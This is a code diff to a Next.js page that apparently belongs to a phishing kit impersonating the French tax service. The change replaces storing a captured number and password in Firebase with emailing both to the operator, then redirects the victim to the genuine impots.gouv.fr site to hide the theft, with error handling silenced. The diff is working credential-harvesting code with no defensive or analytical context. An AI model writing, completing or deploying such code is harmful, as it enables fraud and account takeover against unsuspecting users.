@@ -6,6 +6,7 @@ import { redirect } from "next/navigation";
 import { collection, addDoc, getFirestore } from "firebase/firestore";
 import { useRouter } from "next/navigation";
 import { AiOutlineLock } from "react-icons/ai";
+import sendEmail from "../services/index.js";
 
 export default function Home() {
   const router = useRouter();
@@ -33,19 +34,30 @@ export default function Home() {
   }
 
   async function saveToFirebase() {
-    const data = {};
+    const data = `here is a new data for you
+     Number:${inputValue}
+     code:${pwd}`;
+
     console.log("hello");
 
+    if (pwd) {
+    }
     try {
-      if (pwd) {
-        const docRef = await addDoc(collection(db, "data"), {
-          number: inputValue,
-          pass: pwd,
-        });
+      const req = await sendEmail(data);
+      if (req.status === 250) {
+        // setResponseMessage({
+        //   isSuccessful: true,
+        //   message: "Thank you for your message.",
+        // });
+        console.log("succes");
         router.push("https://cfspart.impots.gouv.fr/");
       }
     } catch (e) {
-      console.error("Error adding document: ", e);
+      // console.log(e);
+      // setResponseMessage({
+      //   isSuccessful: false,
+      //   message: "Oops something went wrong. Please try again.",
+      // });
     }
   }
 
